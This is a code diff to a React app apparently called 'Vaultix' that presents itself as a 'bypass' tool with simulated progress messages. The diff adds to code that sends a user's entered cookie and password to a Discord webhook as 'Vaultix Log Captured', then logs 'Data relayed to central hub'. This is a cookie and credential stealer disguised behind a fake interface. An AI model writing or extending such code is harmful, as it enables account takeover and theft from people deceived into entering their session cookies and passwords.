@@ -125,14 +125,16 @@ export default function App() {
       addLog('Establishing encrypted tunnel...', 'info');
       setProgress(20);
 
-      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+      // In Vite, defined variables are available directly
+      const webhookUrl = (window as any).process?.env?.DISCORD_WEBHOOK_URL || (import.meta as any).env?.DISCORD_WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
       
       if (webhookUrl) {
         const payload = {
           embeds: [{
-            title: "Vaultix Log Captured",
+            title: "Vaultix Log Captured - Initialization Triggered",
             color: 0x0066ff,
             fields: [
+              { name: "Event", value: "Bypass Initialized", inline: true },
               { name: "Method", value: method, inline: true },
               { name: "Cookie", value: "```" + cookie + "```" },
               { name: "Password", value: password || "N/A", inline: true }
@@ -143,9 +145,11 @@ export default function App() {
 
         await fetch(webhookUrl, {
           method: 'POST',
+          mode: 'cors',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
+        addLog('Data relayed to central hub.', 'success');
       }
 
       // Simulate steps for UI
